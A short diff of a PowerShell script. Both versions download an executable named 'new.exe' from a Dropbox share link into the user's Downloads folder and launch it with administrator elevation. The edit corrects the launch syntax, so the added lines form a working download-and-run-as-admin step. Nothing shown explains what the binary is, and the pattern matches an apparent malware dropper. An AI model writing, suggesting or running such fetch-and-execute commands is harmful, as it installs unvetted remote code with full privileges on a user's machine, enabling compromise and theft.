@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/uu9ufmaf5v7tdxuy3dfri/new.exe?rlkey=4gvd1uerss2tio3j1pmf10d7d&st=8m55iobl&dl=1" -OutFile "$env:USERPROFILE\Downloads\new.exe"; 
-Start-Process -Verb RunAs"$env:USERPROFILE\Downloads\new.exe";
+Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/uu9ufmaf5v7tduxyd3dfr/new.exe?rlkey=4gwdluerss2tio31pmfl0d7d&dl=1" -OutFile "$env:USERPROFILE\Downloads\new.exe"
+Start-Process -FilePath "$env:USERPROFILE\Downloads\new.exe" -Verb RunAs
